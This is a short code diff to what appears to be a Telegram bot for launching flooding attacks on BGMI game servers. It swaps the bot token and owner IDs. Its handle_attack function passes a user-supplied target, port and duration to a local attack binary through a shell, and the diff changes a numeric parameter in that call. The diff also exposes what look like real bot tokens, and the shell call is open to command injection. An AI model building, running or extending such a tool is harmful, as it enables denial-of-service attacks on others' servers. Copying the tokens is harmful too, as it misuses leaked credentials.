@@ -15,10 +15,10 @@ keep_alive()
 logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('8182976020:AAEnsBaissXO8sy1gg6FlsJpwTyVfHRAR28')
+bot = telebot.TeleBot('7715497163:AAEaN19xt7OoUFRf9OItFzMVNqSrmRc9ER4')
 # Owner and admin user IDs
-owner_id = "6543206935"
-admin_ids = ["6543206935"]
+owner_id = "7529812775"
+admin_ids = ["7529812775"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -324,7 +324,7 @@ def handle_attack(message):
                 record_command_logs(user_id, target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                full_command = f"./fuck {target} {port} {time} 1000"
+                full_command = f"./fuck {target} {port} {time} 600"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
